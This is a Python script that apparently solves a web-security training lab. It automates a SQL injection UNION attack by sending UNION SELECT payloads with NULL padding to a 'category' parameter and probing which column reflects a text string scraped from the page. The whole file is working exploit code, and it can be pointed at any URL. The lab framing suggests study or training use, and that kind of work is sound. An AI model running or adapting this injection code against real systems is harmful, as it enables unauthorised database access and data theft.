#!/usr/bin/env python3
"""SQL injection UNION attack, finding a column containing text"""

import bs4

import lab_03

class Lab(lab_03.Lab):
    """Wrapper"""

    # pylint: disable=too-many-arguments
    def column_is_string_type(self, column: int, text: str = "a",
                              table: str = "") -> bool:
        """Column index contains text"""
        nulls = ["NULL"] * self.column_count(table=table)
        nulls[column] = f"'{text}'"
        if table:
            table = f"+FROM+{table}"
        query = "'+UNION+SELECT+{}{}{}".format(",".join(nulls), table,
                                               self.comment)
        payload = {self.key: query}
        payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
        response = self.session.get(self.url + self.path, params=payload_str)
        return response.status_code == 200

    def query_string(self) -> str:
        """Get the string to query the database with"""
        response = self.session.get(self.url + "/")
        response.raise_for_status()
        soup = bs4.BeautifulSoup(response.text, features="lxml")
        hint = soup.find("p", attrs={"id": "hint"})
        if hint is None:
            raise RuntimeError("Cannot find query string")
        return hint.text.split()[-1].strip("'")

    def column_index_for_query(self, text: str) -> int:
        """Get the index for the query string"""
        for i in range(self.column_count()):
            if self.column_is_string_type(column=i, text=text):
                return i
        raise RuntimeError(f"Failed to identify index for {text}")

def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    text = site.query_string()
    print(site.column_index_for_query(text=text))

if __name__ == "__main__":
    main()
